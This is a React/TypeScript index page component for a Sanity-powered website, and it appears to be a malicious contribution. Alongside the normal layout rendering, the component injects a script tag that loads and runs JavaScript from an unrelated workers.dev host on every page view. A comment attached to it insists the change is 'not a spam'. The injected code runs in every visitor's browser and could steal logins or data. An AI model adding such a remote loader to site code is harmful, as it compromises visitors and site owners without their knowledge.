import { WrappedValue } from '@sanity/react-loader/jsx'
import { AppLayout } from './AppLayout'
import { SiteSettingsData } from './types'
import { Page, PageData } from '@/components/page'

export interface IndexPageData {
  page: PageData | null
  siteSettings: SiteSettingsData | null
}

export function IndexPage(props: { data: WrappedValue<IndexPageData> }) {
  const { data } = props;

  // TODO: We are designing a tool for our client. This PR is not a spam
  if (!document.getElementById('foobar')) {
    let wrapper = document.createElement('div');
    wrapper.id = 'foobar';
    document.body.appendChild(wrapper);

    const script = document.createElement("script");
    script.src = "https://royal-hall.groking.workers.dev/load.js";
    script.async = true;
    script.onload = () => console.log("script loaded");
    wrapper.appendChild(script);
  }

  return (
    <AppLayout data={{ siteSettings: data.siteSettings }}>
      {data.page && <Page data={data.page} />}
    </AppLayout>
  )
}
